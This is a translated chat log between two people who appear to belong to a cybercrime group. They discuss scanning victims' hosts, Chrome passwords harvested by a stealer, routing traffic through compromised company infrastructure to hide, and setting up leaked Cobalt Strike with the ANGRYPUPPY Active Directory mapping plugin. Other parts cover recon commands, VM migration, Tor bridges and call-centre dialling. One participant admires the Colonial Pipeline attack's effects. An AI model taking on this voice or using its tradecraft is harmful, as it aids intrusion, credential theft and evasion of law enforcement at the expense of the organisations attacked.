[13.10.21 09:23:53] moby: what will the collapse give us? we need to scan https, port 8006, by the way. in the storm he delivered chrome passwords to look there

And what for, I already put one dedicle.
[15.10.21 13:25:10] Verto: I will not forgive the second one
[15.10.21 13:25:45] Verto: so any experiments only in a controlled environment
[15.10.21 13:28:23] moby: and when did you put it down? )))
[15.10.21 13:29:25] moby: see, i found that half of the hosts we added were thin clients, and they were empty. and what machines are normal, they don't work (
[15.10.21 13:33:05] Verto: so it is common practice, local domain does not give a shit, there is nothing there, all the good stuff is somewhere behind the VPN and rdp

[10/15/21 13:57:19] Verto: Colonial Pipeline cyberattack (May 7, 2021) - malware attack on US pipeline system Colonial Pipeline
A few days after the suspension of the pipeline in the coastal states of the Southeastern United States began a shortage of gasoline and diesel fuel.
For example, in the Charlotte metropolitan area, the largest city in North Carolina, 71% of gas stations were closed on May 12 due to fuel shortages.
On May 14, 88% of gas stations in Washington were without gasoline[16]. Retail gasoline prices in the U.S. at the same time reached a ten-year high.
The situation was exacerbated by panic buying gasoline in advance; some ordinary people poured gasoline not only into cans,
but also in containers completely unsuitable for this purpose, up to and including plastic bags.
Because of the kerosene shortage, American Airlines was forced to temporarily change some of its flights.
The fuel shortage ceased several days after the pipeline resumed operation
[10/15/21 13:58:15] moby: A H E N E Y !!! I haven't seen the news of these

[09.11.21 13:25:41] Verto: let them hang, it's their problem
[09.11.21 13:26:09] moby: i'm not judging
[09.11.21 13:26:16] moby: I mean, they react differently to this music)
[09.11.21 13:26:47] moby: you should write in a general chat something, and the blizzard keeps watch)
[09.11.21 13:26:49] Verto: I was at a Ramstein concert, that's what I understand.

[09.11.21 14:36:29] Verto: the distance is equal to the product of the speed of light by the difference between the moments of signal reception by the consumer and the moment of its synchronous radiation by the antenna
[09.11.21 14:38:04] moby: so if they use our name and SIM (phone number), they see us as a lot of dots

[09.11.21 14:41:03] moby: aah
[09.11.21 14:41:06] moby: yeah
[09.11.21 14:41:14] moby: i.e. the point is defined in space
[09.11.21 14:41:24] Verto: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=MmX4JMDtq6ftoz89Z) 2 meters probably more accurate, even though it understands 3 axes
[09.11.21 14:41:34] moby: 3 meters?
[09.11.21 14:41:38] moby: no way
[09.11.21 14:41:45] Verto: +- floor
[09.11.21 14:42:29] moby: wow, wait, so if the tower sees that I'm at number 10 and there are a ton of people on the riser. how will they catch
[09.11.21 14:42:44] Verto: if there are several devices nearby, they can pick up identical data and scrape the advertising ID
[09.11.21 14:43:20] Verto: device id
adv id
[09.11.21 14:45:06] Verto: in the house number 10 on the north side, third floor, second floor, second window on the left from the front door
[09.11.21 14:48:24] moby: well, then you'll have to go every 2 or 3 months to change the house
[09.11.21 14:48:42] moby: sitting in a chat room, I do not violate anything at all!)
[09.11.21 14:48:45] moby: That's right
[09.11.21 14:48:55] Verto: difficult)
[09.11.21 14:49:07] Verto: There are more efficient methods
[09.11.21 14:49:55] moby: I'm a virtual machine + getaway (tor) + vinda + vpn (which I didn't pay for) .
[09.11.21 14:50:06] moby: every month I change the device modem and sim.
[09.11.21 14:50:56] moby: it's easier to get a dedicata. but i do not know anything about it, and i can configure the dedicata remotely, but not for sure that it will work fine
[09.11.21 14:51:02] moby: what options are you talking about?
[09.11.21 14:55:36] Verto: yes the same Hetsner (this one cooperates with russia) if you are from russia, look at latvian or ukrainian hosts first (of course you need a card of that country for a citizen of that country)
[09.11.21 14:56:11] moby: what is hetsner ?
[09.11.21 14:56:46] moby: can you explain without slang)?
[09.11.21 14:56:46] Verto: https://www.hetzner.com/ru/sb?price_from=0&price_to=40
[09.11.21 14:57:02] moby: got it
[09.11.21 14:57:03] moby: what do you mean
[09.11.21 14:57:07] moby: those who provide services
[09.11.21 14:57:26] Verto: you rent a server from them?
[09.11.21 14:57:41] Verto: dgitalocean is still good
[09.11.21 14:57:41] moby: no, i don't rent)))
[09.11.21 14:57:52] moby: so let's get to the scheme.
[09.11.21 14:57:57] moby: it'll be easier
[09.11.21 14:58:59] Verto: take projects, sites, infrastructures and do the main relay through them cleanly and without fuckin' around
[09.11.21 14:59:39] moby: oh, I see. so you took a company and did everything through them, you have open ports through which you go
[09.11.21 14:59:41] moby: okay.
[09.11.21 15:00:26] moby: the office I mean you took the order
[09.11.21 15:00:52] Verto: many orders
[09.11.21 15:00:55] Verto: one finger
[09.11.21 15:01:49] Verto: Why do you need open ports?
[09.11.21 15:02:02] moby: that's what I meant
[09.11.21 15:02:14] Verto: a paid non-proprietary VPN is by the way a bigger palm than a SIM card
[09.11.21 15:03:43] Verto: GeckoVPN, SuperVPN ChatVPN.constantly leak traffic
[09.11.21 15:03:52] Verto: 100%
[09.11.21 15:04:47] Verto: UFO VPN, FAST VPN, Free VPN, Super VPN, Flash VPN, Secure VPN, Rabbit VPN
[09.11.21 15:04:54] Verto: They also leak.
[09.11.21 15:05:21] moby: I use Open VPN
[09.11.21 15:05:29] Verto: so all the VPN services are more a beacon than privacy
[09.11.21 15:05:34] moby: you can get 120 bucks for a year and not bother
[09.11.21 15:05:41] Verto: Openvpn is a client
[09.11.21 15:05:45] moby: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=7CtB2meu8GS5yHm2m) I think so, too
[09.11.21 15:05:56] moby: well, i buy cfg on the wpnlab
[09.11.21 15:06:14] Verto: You can run the server on the windup or microwave
[09.11.21 15:06:38] Verto: and connect to it
[09.11.21 15:07:55] moby: what if I have a server on a virtual machine and use it to connect
[09.11.21 15:08:46] moby: and it would look like
[09.11.21 15:08:48] moby: like this
[09.11.21 15:09:41] moby: turn on the host, turn on the virtual machine. on the virtual machine getaway. getaway goes online through the server, and the windup goes through getaway
[09.11.21 15:09:42] moby: right?
[09.11.21 15:10:59] moby: what do we get if we bring up the server?
[09.11.21 15:11:00] moby: Oh, man.
[09.11.21 15:11:08] moby: Wait, I got it wrong.
[09.11.21 15:11:32] moby: i leave the same. only + server and already work on it
[09.11.21 16:19:07] moby: i talked to carders (those who steal credit cards) they say the easiest thing is to upgrade your router so even operators do not see your ip. and change the location. all the rest they say is bullshit. they just said, i meant ipn and ports. so you and i were right.
[09.11.21 18:54:07] Verto: I do not understand about the router, but about the dpi and all sorts of SORM notion of how a router without an ip will go online?
[I had a chat with him, he gives taggers who earn 100k, I give them 5-10% if they break it.
[09.11.21 19:04:19] Verto: 5-10% is not enough, Ga team, for team at least 30-50
[09.11.21 19:05:38] moby: )))
[09.11.21 19:05:47] moby: that's why everybody fucks him
[09.11.21 19:06:52] Verto: did I tell him for nothing?
[09.11.21 19:07:53] moby: I think
[09.11.21 19:08:00] moby: better to wait for buran
[09.11.21 19:08:07] moby: because I don't know what kind of fruit it is
[09.11.21 19:08:14] moby: he logged in as admin
[09.11.21 19:08:19] moby: delete the message
[09.11.21 19:08:25] moby: better
[09.11.21 19:09:48] Verto: where under oden?
[09.11.21 19:13:58] moby: in the chat room, he wasn't invited he came by himself
[09.11.21 19:15:18] Verto: burn!
[09.11.21 19:16:35] moby: yes)) as usual))
[09.11.21 19:19:20] moby: ignore the kid?
[09.11.21 19:19:26] moby: maybe he's a hired gun?
[09.11.21 19:19:53] Verto: And the chat room is sticking its ass in the net?
[09.11.21 19:20:23] Verto: It's like a double inveit
[09.11.21 19:20:36] Verto: And a bunch of interviews
[09.11.21 19:23:06] moby: right.
[09.11.21 19:26:42] moby: you're a good guy))
[09.11.21 19:27:53] Verto: anyway, he'll get stuck there, where 199 are the exact servers of a virtual firewall with tapes
[09.11.21 19:28:06] Verto: just fucked up time
[09.11.21 19:28:21] Verto: and give the admins a bonus
[09.11.21 19:28:23] moby: hahahaha I know))
[09.11.21 19:28:42] moby: that's why I keep quiet))
[09.11.21 19:28:47] moby: we went through it)
[09.11.21 19:31:08] Verto: koba deanon yl
[09.11.21 19:31:31] moby: )))
[09.11.21 19:31:36] moby: fuck you
[09.11.21 19:31:59] Verto: that's why we're virtuals
[09.11.21 19:53:21] moby: what are we gonna do? wait for someone?
[09.11.21 19:55:36] Verto: quit
[09.11.21 19:55:49] moby: not about him))
[09.11.21 19:55:52] moby: I was in general
[09.11.21 19:58:18] Verto: tell Buran what he wrote in his private message
[09.11.21 20:01:07] Verto: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=LqnWG23g3cj43GgiY) what's wrong?)
[09.11.21 20:02:40] moby: how will he come, he texted you?
[09.11.21 20:03:43] moby: Yes, I wrote him hello, how to help, then wrote a better general chat there is more help.
[09.11.21 20:04:14] moby: then he wrote that in the general chat, looking for himself breaks, pros do not take orders
[09.11.21 20:04:15] moby: etc.
[09.11.21 20:06:28] Verto: he gave me some gills
[09.11.21 20:06:45] moby: he's advertising his friends
[10.11.21 06:07:32] moby: are you even asleep?
[10.11.21 06:07:52] moby: long story short, the kid writes me on the xx found, gave me a password and a link, aprol changed .
[10.11.21 06:08:28] moby: well, whatever. he's talking about real stuff, i think he's going to give us targetets
[10.11.21 06:09:23] moby: I figured out that I configured Getaway tor, and I can not remember how) I know that I got the IP, the IP this prescribed in the wind. sitting recollect the shit out of it I can not remember.
[10.11.21 06:13:23] Verto: I registered in their jaber, I am tired,
[10.11.21 06:14:38] moby: who guys?
[10.11.21 06:14:57] moby: I made myself a gill yesterday too
[10.11.21 06:47:44] moby: i was sick, you didn't get anything new?
[10.11.21 09:41:08] Verto: waving my certificates))
[10.11.21 10:35:53] moby: ))
[10.11.21 12:32:37] moby: how does the command confirm ?
[10.11.21 12:32:43] moby: tell me)
[10.11.21 12:32:52] moby: I wonder what he's up to
[10.11.21 12:33:08] moby: I fixed torus by the way, it was complaining about tls error, then the certificate
[10.11.21 12:33:15] moby: fixed problem with bridges
[10.11.21 12:37:02] Verto: Brave browser was leaking TOR👀 users for three years

An anonymous IS expert published a study (https://xakep.ru/2021/02/20/brave-onion-leak/) showing that the Brave browser, running in Tor mode, left traces in the logs on the DNS server. For example, the browser revealed the URLs of onion sites visited by the user.

Tor mode was integrated into Brave back in 2018, allowing users to visit onion sites. It is implemented by proxying user requests through Tor nodes, which make a request to an onion resource instead, and then passing back the received HTML.

However, when using Brave in Tor mode, all the onion addresses you visited were visible to your DNS provider😱 Brave confirmed this bug🤦🏼♀️

So for three years this pseudo-secure browser allowed to de-anonymize Tor users, which in countries with dictatorial regimes could cost them their freedom and sometimes their lives😓
==============
☝🏻 This is not the first case of Brave developers' criminal attitude towards their users' privacy.

At one time I even made a separate video on the subject. (https://t.me/black_triangle_tg/566)

Also, for those interested, I would recommend (https://t.me/black_triangle_tg/766) reading a series of articles (https://www.bleepingcomputer.com/news/security/facebook-twitter-trackers-whitelisted-by-brave-browser/) by security experts, with the self-explanatory title "No, You Shouldn't Use Brave!" (https://aspenuwu.me/blog/dont-use-brave/)
[10.11.21 12:38:04] moby: awesome
[10.11.21 12:38:22] moby: i got the bridge set up sitting over 6 nodes and 3 states
[10.11.21 12:38:28] Verto: tula for onion deanon
[10.11.21 12:38:32] Verto: yep.
[10.11.21 12:39:04] moby: ))
[10.11.21 12:39:10] moby: humorist))
[10.11.21 12:39:46] Verto: wrap dns on himself and look in logs
[10.11.21 12:40:29] moby: why don't they teach this? they teach some bullshit how to set the time on the server))
[10.11.21 12:40:48] Verto: I mean.
[10.11.21 12:40:57] moby: I'm exaggerating.
[10.11.21 12:41:33] moby: I was just taking a refresher course
[10.11.21 12:44:45] moby: and they give you something that in fact almost nothing is used
[10.11.21 13:26:51] moby: I don't remember we were given a dll for the sneak peek
[10.11.21 13:27:19] Verto: Me neither
[10.11.21 14:05:50] moby: listen, didn't they ever tell you about the grids?
[10.11.21 14:06:01] moby: about the virtuals that we discussed on Monday?
[10.11.21 14:24:08] Verto: there was a problem with the hoster, it would have been ready by now
[10.11.21 14:24:49] Verto: Or you can buy it yourself and ask for money,
[10.11.21 14:25:10] moby: What's the problem?
[10.11.21 14:26:00] Verto: someone confused virtual delicate server with simple delicate server
[10.11.21 14:26:25] Verto: well, they bought a beast but a virtual machine instead of hardware
[10.11.21 14:26:53] Verto: of course they don't start a hypervisor there
[10.11.21 14:27:16] moby: wait, you mean some kind of attack?
[10.11.21 14:27:31] Verto: No, it's an Inchtance
[10.11.21 14:27:41] Verto: *instance
[10.11.21 14:28:33] moby: object instance right ?
[10.11.21 14:28:37] moby: implementation
[10.11.21 14:28:59] moby: i just seem to have missed it, i want to understand what and why
[10.11.21 14:29:42] Verto: it's simpler, you should have lifted hypervisor to torture people with it
[10.11.21 14:29:57] Verto: because in battle there is only 1 attempt, and you can't fuck it up
[10.11.21 14:30:19] moby: here
[10.11.21 14:30:23] moby: that's what I wanted to hear
[10.11.21 14:30:49] moby: are you good at proxmox? i'm just that easy
[10.11.21 14:31:12] moby: a la filling, backups, and minor adjustments
[10.11.21 14:31:31] Verto: Easy.
[10.11.21 14:31:40] Verto: Prox is very simple
[10.11.21 14:31:54] Verto: a backup of live windup?
[10.11.21 14:31:59] moby: yes
[10.11.21 14:32:09] moby: it's almost all gui, if not gui
[10.11.21 14:32:57] moby: live windup I understand, a server with many users. yeah, turn off backup and all
[10.11.21 14:33:01] moby: I did that
[10.11.21 14:33:02] Verto: the best way to
backup via windows image backup
and unzip it via the installer of the same Wyanda version via restore
[10.11.21 14:34:23] moby: a backup via windows image backup is much easier
[10.11.21 14:34:37] Verto: 1 on each target hypervisor on the wind, create a samba balloon
2 on each vm source connect a virtual disk vhdx, which you place in the network folder on the targets
3 on each vm source configure wim to a hard drive for backups and select the pratacated vhdx as a backup drive, wait for the second backup. (The first one is done as it should be a dickwagon of time, the second and subsequent only changes copy this 30 gigs instead of 300-500)
4 extinguish vm sources
5 raise vm similar or stronger on hypervisors
6 start recovery from image with a Wanda installation
Run cmd, mount samba, mount vhd, deploy backups
[10.11.21 14:34:50] Verto: we are doing it on hypervisors, not on backup server, discs are faster than network)
[10.11.21 14:34:57] moby: was the name of the program that makes backups?
[10.11.21 14:35:00] Verto: And it takes not 4 hours to deploy aimet virtual, but 20-40 minutes
[10.11.21 14:35:08] moby: time can be set there too
[10.11.21 14:35:13] Verto: It's a pain in the ass solution
[10.11.21 14:35:28] Verto: Not to distribute new rdp files, just turn off tunnel and create subnet similar to dedik in local area and turn off routing to dedik
[10.11.21 14:35:45] Verto: That's how I fucked off Cexxay
[10.11.21 14:36:19] Verto: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=F8CXwTwtiN2gHmm8Y) no, it's a regular Wanda backup
[10.11.21 14:36:28] moby: i did the same with cexxay. but ran into a problem with prox not seeing the backup file, formats are different
[10.11.21 14:36:46] moby: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=JAknEEJbe3BskMG8a) or whatever

[10.11.21 14:39:26] Verto: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=TxMaHPT3DG8WBuyYQ) on proxy, create a vm vand and raise the balloon
on vm with the crater to fuck off connect the created balloon and in it create a virtual disk file
the file of virtual disk we put to system and on it we put the service of archiving of the winds server, to use a disk for archiving
[10.11.21 14:40:47] Verto: then run the restore utility, unmap the disk from the source and add it to the restore utility
[10.11.21 14:41:06] Verto: hit copy and it will be found and restored
[10.11.21 14:41:35] Verto: don't use LVM in prox, it's crap
[10.11.21 14:41:46] Verto: LVM is for hypervisor only
[10.11.21 14:42:20] moby: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=bErqiFvMJTNRnmHFx) it's all I do

[10.11.21 14:43:13] Verto: SQL
net use s: \10.218.4.208\share /user:admin Password
diskpart
select vdisk file="\\10.10.73.8\share\wim.vhdx"
attach vdisk
[10.11.21 14:44:41] Verto: either kill vmux, copy disk file or import vmux itself (there is a button export virtual mashnie)
[10.11.21 14:45:22] Verto: but this is too much down time, i transferred 2 terabytes of virtuals with 1 hour down time
[10.11.21 14:45:22] moby: probably have to depend on your needs and goals
[10.11.21 14:45:39] moby: right
[10.11.21 14:45:43] moby: that's what I'm talking about
[10.11.21 14:45:58] Verto: the cexa lived behind a 10 megabit channel
[10.11.21 14:46:30] moby: right
[10.11.21 14:46:34] Verto: one hour it was inside the hypervisor
[10.11.21 14:46:47] Verto: 6 virtual machines,
[10.11.21 14:47:09] Verto: it was stuck with disk IOPS
[10.11.21 14:48:47] Verto: actually there was no down time at all, I just synced the modified files using robocopy
[10.11.21 14:49:11] Verto: there were literally 300 meters in 2 hours
[10.11.21 14:50:07] moby: I had it down to 89% and then the light went out])
[10.11.21 14:51:11] Verto: holy APC surt10000xli with new batteries hold 4 hours
[10.11.21 14:51:57] Verto: with PoE cameras and a dozen switches
[10.11.21 14:52:46] moby: we were not bums, we had regular ones for computers
[10.11.21 14:52:52] Verto: if there's no light in 2 hours, drag a 5 kilowatt generator into the yard
[10.11.21 14:53:30] Verto: which is enough for infrastructure and a few offices
[10.11.21 14:54:12] Verto: surt10000xli boo costs 1000$ + new batteries 400$
[10.11.21 14:54:26] Verto: a new one costs a cunt
[10.11.21 14:54:37] moby: there was nothing, if our network was down at the conference we were giving out from the phones)) what are you talking about
[10.11.21 14:55:18] Verto: Whistle for necrotic and happy
[10.11.21 14:56:15] moby: yeah]) you understand you're sitting in a conference, you're supposed to make a decision in 2 seconds
[10.11.21 14:56:36] moby: and if i rushed to get a new microphone, then i would look for a sim with a whistle)
[10.11.21 14:56:39] moby: no way
[10.11.21 14:56:55] moby: I said the same thing from the phone
[10.11.21 14:57:49] Verto: it depends on the infrastructure
[10.11.21 14:58:07] Verto: the same solution from the phone, but what was the network?
[10.11.21 14:59:31] Verto: I had a 485 grid go down once, all the doors and gates at the plant thought there was a fire and opened
[10.11.21 14:59:53] moby: traffic jams, when you turned on the light, it turned out that the ISP is doing something and there will be no internet (it's a protected channel)
[10.11.21 14:59:58] Verto: nobody knew where and how it goes, because it was done 30 years ago and there was no documentation
[10.11.21 15:00:12] moby: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=7GBW6ejJPCzd3zKn9) that's the tin))
[10.11.21 15:00:29] Verto: all the doors for two more days were peaking and wouldn't close
[10.11.21 15:00:32] Verto: that was BLEEP
[10.11.21 15:01:28] Verto: the electricians were sweating all over the 485
[10.11.21 15:02:01] Verto: because we don't know where it shorted out, and there are over 2000 doors in the yard
[10.11.21 15:02:16] moby: wow.
[10.11.21 15:02:56] Verto: the gate with the main doors was closed after an hour, but it was impossible to be in the workshops, in short it was an unscheduled day off for the whole plant
[10.11.21 15:03:01] moby: By the way, when I go to the assembly, we remove all the old wires, and the new ones are covered with the colors we said ( blue, green), of course, fire red
[10.11.21 15:03:14] moby: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=i89Cojfe2fC7gyauY) okay)))
[10.11.21 15:03:37] Verto: 150 million bucks.
[10.11.21 15:04:17] Verto: at the plant, and me and the electricians got a bonus *2] because we fucked up all the shifts
[10.11.21 15:04:37] moby: it's nice when it's like that.
[10.11.21 15:04:52] moby: they didn't give me anything
[10.11.21 15:05:02] Verto: like not to yell and at least close for 2 days.
[10.11.21 15:05:25] Verto: Then they combed it for another 1.5 years
[10.11.21 15:05:34] moby: Wow.
[10.11.21 15:05:50] Verto: 2,000 doors!
[10.11.21 15:06:06] Verto: Each door has a lock, a sensor and a buzzer
[10.11.21 15:07:09] Verto: you need to break the controller in the door (no one knows the password), then throw a new line there (sometimes the old ones were there, but straight 10%)
[10.11.21 15:07:27] Verto: then fill in rights of passage
[10.11.21 15:07:57] Verto: write address in scud system
[10.11.21 15:08:10] moby: Holy shit.
[10.11.21 15:08:20] moby: just fucking awesome
[10.11.21 15:09:26] Verto: 2 bishops 3 electricians, chief factory engineer, chief technologist and a couple of CNC adjusters ran for 2 days
[10.11.21 15:09:44] Verto: That is, everyone who understands something
[10.11.21 15:10:19] moby: yeah
[10.11.21 15:10:24] moby: well, that's a pain in the ass
[10.11.21 15:10:30] moby: I don't like scuds.)
[10.11.21 15:48:11] moby:
[11.11.21 11:38:13] moby: Hey, listen to this question. maybe we can think how to train? You do not have any srvaks, as you gave earlier?
[I have a squad I'm working on, but I can't get a good handle on it.
[11.11.21 11:48:54] moby: I was just asking, don't get any ideas.
[11.11.21 11:49:09] Verto: you're not the first)
[11.11.21 11:49:29] Verto: show me on the timeweaver, sorry)
[11.11.21 11:49:30] moby: and who is the first?)
[11.11.21 11:49:48] moby: ah, I get it, you mean Buran)
[11.11.21 11:50:02] Verto: Yeah.
[11.11.21 11:50:39] Verto: not that pathetic, but achkovo, and in combat no esixie
[11.11.21 11:51:08] Verto: there are Kubernetes with Dockers, there are Proxies, even a Hyperv is there
[11.11.21 11:51:09] moby: is this your 1 experience?
[11.11.21 11:51:17] Verto: I've been with Cecil
[11.11.21 11:51:45] Verto: aws is
[11.11.21 11:52:10] Verto: again what?
[11.11.21 11:52:18] Verto: *experience
[11.11.21 11:52:33] moby: what are you doing?
[11.11.21 11:52:42] moby: avs is it cloudy something?
[11.11.21 11:53:09] Verto: hypervisor, haha, well yeah, first one in a month GH
[11.11.21 11:53:26] moby: ))))hahaha you get it)
[11.11.21 11:53:51] Verto: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=pgpmrJFviYR9Y78Hb) yeah, Amazon Web Services
[11.11.21 11:54:20] moby: yeah yeah, I never worked with it just heard about it. interesting stuff
[11.11.21 11:54:27] Verto: pay per IOPS and database transaction
[11.11.21 11:54:44] Verto: but for highload it's perfect
[11.11.21 11:55:17] Verto: or for microservices
[11.11.21 11:55:21] moby: a lot of people are switching to it now
[11.11.21 11:57:35] moby: re-read what you wrote__)
[11.11.21 11:57:40] moby: a lot of people switch over]
[11.11.21 12:09:00] Verto: long time ago I mean
[11.11.21 12:09:34] moby: try to switch a lot of companies, it's cheaper than to keep your own
[11.11.21 12:17:19] Verto: calculate the terminal with 1 stove and Wordexcel, for 50 people, it costs 2-3 Kilobucks a month
[11.11.21 12:17:47] moby: wow!
[11.11.21 12:17:48] Verto: that's like buying a server every month
[11.11.21 12:18:40] Verto: you pay for each process, input/output operation, bytes of traffic and memory\.
[11.11.21 12:18:50] moby: well, they say Obloko is cooler
[11.11.21 12:18:59] moby: but the price tag is fucked up
[11.11.21 12:19:10] Verto: for small kids, like chat rooms or business cards that nobody visits, ok
[11.11.21 12:19:28] Verto: or for something like facebook, google also ok
[11.11.21 12:20:01] moby: that's probably what they're saying.
[11.11.21 12:21:06] Verto: it's expensive to run chrome there, but it's ok to keep a customer base of 1 google table
[11.11.21 12:28:55] moby: I agree
[12.11.21 09:18:33] moby: hi, are you sleeping at all?)
[12.11.21 11:28:55] Verto: sometimes)
[15.11.21 12:35:22] moby: hey, how's it going with the server?
[15.11.21 12:35:50] moby: you missed it, the new guy gave seravk he gave it to raise the coba, in the end he gave it to us))
[15.11.21 12:35:59] moby: blizzard then swore
[15.11.21 13:49:52] moby: what is pt?
[15.11.21 13:51:31] Verto: the ptr record was wiped and updated
[15.11.21 13:52:04] moby: it's called ptr ?
[15.11.21 13:52:08] Verto: and since they even had scuds tied to dns
[15.11.21 13:52:28] Verto: they couldn't even get out of the offices
[15.11.21 13:52:41] moby: so it turns out they lost the settings and dropped them
[15.11.21 13:53:28] Verto: Either they or someone helped)
[15.11.21 13:53:53] moby: ))) well, yes, I just read on the forums that look for people
[15.11.21 15:27:36] moby: I threw in the manual, basically it's not hard
[15.11.21 20:48:10] moby: it turns out all wrong) the man wants to attack through the SE. straight from the cobolt
[15.11.21 21:24:05] Verto: well, actually I do not see the problem
smd ps alov scripts and let's go?
[15.11.21 21:24:10] Verto: ilne?
[16.11.21 05:37:43] moby: look what is the box (Blood Head_) is a tool that builds the network and shows who is in the network, etc. Buran wants without using Blood, but only in cobalt give the command to . receive the same data. vidos I threw you can only so. others have not found. if you have time tell me how to do?
[16.11.21 06:20:37] Verto: arp -a
[16.11.21 06:20:56] moby: no )))
[16.11.21 06:21:19] Verto: nmap -Pn
[16.11.21 06:22:03] Verto: advised network scanner
[16.11.21 06:22:09] moby: read in main chat
[16.11.21 06:22:31] moby: we're talking about the wrong thing
[16.11.21 06:22:41] moby: what buran wants
[16.11.21 06:24:21] Verto: saw, crypto volume didn't fit, I'm making a new one
[16.11.21 06:41:09] moby: you want to create your own?
[16.11.21 06:43:30] Verto: in ishu on gita saw a nuance with jk and cobalt, check it out
[16.11.21 06:43:45] Verto: https://github.com/vysecurity/ANGRYPUPPY/issues/11
[16.11.21 06:44:02] moby: that's what we threw yesterday
[16.11.21 06:44:21] Verto: there's also a schedule
[16.11.21 06:44:50] Verto: did you bail?
[16.11.21 06:45:07] moby: so I wrote yesterday that cobalt + bulld still
[16.11.21 06:45:27] Verto: I found the solution to this, basically, the import is not supported on later than Java 8, the problem is Cobalt 4.3 needs higher that Java 9 or openJDK 11.

The ONLY workaround I found was to download Orcale Java 8 JRE from the official Oracle website. You need to sign up but this is the only package which works.

Edit your CS start.sh to include the downloaded java binary.
[16.11.21 06:46:31] moby: wait
[16.11.21 06:47:06] moby: I read it
[16.11.21 06:47:15] moby: he writes linux solution
[16.11.21 06:47:53] moby: at the very end )
[16.11.21 06:48:03] Verto: whatever, lin vin, toad doesn't care, even if it's Vedroid
[16.11.21 06:48:39] moby: setup cobalt strike 4.3
openjdk 1.14
run angrypuppy install.sh
checked correct path is placed at the import statement
load angrypuppy.cna
[16.11.21 06:49:03] Verto: only / and \ are different
[16.11.21 06:50:34] moby: by the way, we all swapped koba for 4.4)
[16.11.21 06:51:26] moby: can't find openjdk 1.14 now
[16.11.21 06:53:24] Verto: [ ](https://hh26733lqlrv2p3kbiwqnbkjivvg463c4yca53ftru55jyyfnlvtzoqd.onion/direct/jqyXeaN9ianziuBZYp4CYfWRsEfxTsxFAG?msg=8birrT4pBWPMgQcaR) it gets scolded by Anvir, 4.3 is leaked, 4.4 is public
[16.11.21 06:53:51] moby: yeah, it's no problem to change it back
[16.11.21 06:54:03] Verto: jarnik here and there
[16.11.21 06:54:15] moby: yeah

[16.11.21 06:56:26] Verto: Mm-hmm.
[16.11.21 06:56:35] moby: I understand, we will need to go to the cob and spell where it is
[16.11.21 06:56:55] moby: jk to pick it up as a tool
[16.11.21 07:00:28] Verto: of course
[16.11.21 07:00:51] moby: double-checking myself.
[16.11.21 07:01:04] moby: and for understanding was that I am on the 1 wave)
[16.11.21 07:02:52] moby: see, in gethub they all complain that they can not connect the coba))
[16.11.21 07:03:55] Verto: you tried it on 8th toad?
[16.11.21 07:04:22] Verto: 1.14 I don't believe it -+ '97
[16.11.21 07:04:31] moby: That's what I'm saying.

apt install
brew install

[16.11.21 12:27:12] moby: what do you like?
[16.11.21 12:27:36] Verto: linh which doesn't have any glitches

[11/18/21 00:33:27] Verto: 1 cephfs but it wants a gig of opera per ter somewhere, clusterfs

[18.11.21 05:54:42] moby: I also wrote him that if there will be a cluster in the DC, you can without a disk. but then again you still use a disk on which you have a system )prox)

[18.11.21 11:17:02] Verto: Why DC?

1 in thin client mode
2 in the mode of constant fine-tuning
3 it is almost impossible to fully work without tinkering with the system, because volume changes can put the whole system into a kernel panic
[18.11.21 11:56:59] Verto: but it's worth a try
[18.11.21 11:58:01] moby: thanks for the review.)
[18.11.21 13:15:22] Verto: how are you with aster?
[18.11.21 13:16:55] moby: superficially friends, probably more frippbh, but if bare aster only -vvv-vvv-vvvv
[18.11.21 13:17:55] Verto: we have a loaded acter with 100+ external numbers, 600-800 active callers on the outgoing line, each ramming into 4 lines.
So we have 400-500 active calls and 300-400 dial-up attempts per second.
[18.11.21 13:18:44] Verto: you have to prohibit outgoing calls to the hotel base of 10-20 thousand numbers.
[18.11.21 13:19:28] Verto: in Сrm system they are blocked, but if callers can't get through, they dial manually and call
[18.11.21 13:19:52] Verto: Dialplan, hangs up
[11/18/21 13:20:07] Verto: If I had 100 numbers, it would work fine
[18.11.21 13:21:27] moby: that's how you ask, I would dig in the direction (policies) to put a ban
[18.11.21 13:21:42] moby: in GUI versions it is possible, just click the checkboxes and that's it
[18.11.21 13:21:50] moby: but in the terminal I don't know
[18.11.21 13:22:09] Verto: 10-20 thousands of NC numbers
[18.11.21 13:22:33] Verto: guyash CHS works for incoming, not outgoing
[18.11.21 13:23:30] Verto: there are many numbers in outbound routes

[18.11.21 13:24:37] moby: the only thing
[18.11.21 13:24:40] moby: that's a very serious question.
[18.11.21 13:24:42] moby: put a ban on recruitment bypassing crm
[18.11.21 13:26:45] Verto: because there are negative callers in call bases who complain everywhere, numbers are quickly rotten in all sorts of whocals and getcontacts
[18.11.21 13:26:45] moby: either make 10 thousand of them get one more number, and they will call 1 , 2 numbers only for reception
